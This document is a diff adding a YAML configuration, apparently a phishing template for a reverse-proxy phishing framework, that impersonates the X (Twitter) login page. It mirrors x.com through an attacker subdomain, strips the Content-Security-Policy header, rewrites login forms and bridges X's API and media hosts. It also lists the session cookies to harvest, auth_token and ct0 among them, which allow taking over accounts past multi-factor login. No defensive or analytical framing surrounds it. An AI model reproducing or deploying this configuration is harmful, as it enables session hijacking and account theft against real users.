@@ -1,0 +1,31 @@
+name: "X-Login"
+author: "Vanta v5"
+min_ver: "5.0.0"
+proxy_hosts:
+  - subdomain: "x"
+    target: "x.com"
+auth_urls: ["/i/flow/login"]
+landing_path: ["/i/flow/login"]
+auth_tokens:
+  - {type: "cookie", name: "auth_token"}
+  - {type: "cookie", name: "ct0"}
+  - {type: "cookie", name: "guest_id"}
+  - {type: "cookie", name: "personalization_id"}
+credentials: []
+injections: []
+headers:
+  - {action: "remove", name: "Content-Security-Policy"}
+path_rewrites:
+  - {pattern: "^/$", replace: "/i/flow/login", methods: ["GET"]}
+cookie_rewrites: []
+blocklist:
+  - {pattern: "analytics|gtm|/static/", mimes: ["text/javascript"], max_kb: 512}
+form_actions:
+  - {selector: "form[action*=\"login\"], form[data-testid*=\"Login\"]", action_to: "/sessions"}
+bridges:
+  - {prefix: "/_xapi/", target_host: "api.x.com", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_xabs/", target_host: "abs.twimg.com", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_xton/", target_host: "ton.twimg.com", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_xpbs/", target_host: "pbs.twimg.com", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_xtapi/", target_host: "api.twitter.com", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_xtw/", target_host: "twitter.com", strip_prefix: true, cors: "mirror"}
